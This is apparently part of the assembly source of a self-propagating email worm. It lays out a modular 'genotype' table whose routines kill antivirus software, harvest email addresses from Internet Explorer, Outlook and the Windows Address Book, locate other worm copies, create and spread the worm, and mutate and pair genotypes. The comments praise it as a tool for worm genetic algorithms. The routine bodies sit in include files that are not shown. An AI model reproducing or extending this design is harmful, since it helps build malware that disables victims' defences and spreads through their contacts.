;Here startz the description of worm genotype. Every "addition" code that can
;be advanced sometimez later is written in separate part of genotype, so called GEN,
;so it can be later easily updated and passed down to another worm generation. Genotype
;is easily exchangable and updateable with another genotypez = it is very good tool
;for creating worm genetic algorithms!
;
;
;----------------------------------------------
;structure is very simple:
;
;DWORD	count_of_gens
;
;BYTE	type of gen
;DWORD	relative pointer to gen procedure
;DWORD	size of gen procedure
;
;	... X count_of_gens
;----------------------------------------------
;
;
;Becoz gen procedures MUST be TOTALLY independend on other worm code, and also
;must have specific functionality, it recieves some parameterz via registers.
;EVERY procedure has initialized ESI and EDI registerz - there are pointerz to
;GetModuleHandleA and GetProcAddress APIz.
;Depending on gen type, in EBX there may be one, procedure specific parameter.
;And also, output is passed out in EAX.




GENOTYPE:	dd	11

		db	GEN_INITWORM
		dd	offset kill_avs-GENOTYPE
		dd	end_kill_avs-kill_avs



		db	GEN_FINDVICTIMS
		dd	offset get_email_addresses_from_ie-GENOTYPE
		dd	end_get_email_addresses_from_ie-get_email_addresses_from_ie

		db	GEN_FINDVICTIMS
		dd	offset get_email_addresses_from_ol-GENOTYPE
		dd	end_get_email_addresses_from_ol-get_email_addresses_from_ol

		db	GEN_FINDVICTIMS
		dd	offset get_email_addresses_from_wab-GENOTYPE
		dd	end_get_email_addresses_from_wab-get_email_addresses_from_wab



		db	GEN_FINDWORM
		dd	offset find_worm_ftp-GENOTYPE
		dd	end_find_worm_ftp-find_worm_ftp

		db	GEN_FINDWORM
		dd	offset find_worm_ip-GENOTYPE
		dd	end_find_worm_ip-find_worm_ip



		db	GEN_CREATEWORM
		dd	offset create_worm-GENOTYPE
		dd	end_create_worm-create_worm



		db	GEN_SPREADWORM
		dd	offset spread_worm-GENOTYPE
		dd	end_spread_worm-spread_worm



		db	GEN_PAIRGENOTYPES
		dd	offset pair1-GENOTYPE
		dd	end_pair1-pair1



		db	GEN_MUTATEGENOTYPE
		dd	offset mutate1-GENOTYPE
		dd	end_mutate1-mutate1



		db	GEN_CUSTOM
		dd	offset dotnet-GENOTYPE
		dd	end_dotnet-dotnet



;--------------------------------------------
;
;INPUT:
;	1st argument		-	EBX
;	GetModuleHandleA API	-	ESI
;	GetProcAddress API	-	EDI
;
;OUTPUT:
;	CF	-	set if error
;	EAX	-	result
;
;--------------------------------------------


;*************************************************************************************


include	genz\avs.inc

include	genz\ie.inc
include	genz\ol.inc
include	genz\wab.inc

include	genz\fwf.inc
include	genz\fwi.inc

include	genz\cw.inc
include	genz\sw.inc

include	genz\p1.inc

include	genz\m1.inc

include genz\dotnet.inc


end_GENOTYPE:


DISPPARAMS              STRUC
Arguments               DD      0       	;Array of arguments.
Disp_IDs                DD      0       	;Dispatch ID's of named arguments.
Argument_Count          DD      0       	;Number of arguments.
Disp_ID_Count           DD      0       	;Number of dispatcher IDs.
DISPPARAMS              ENDS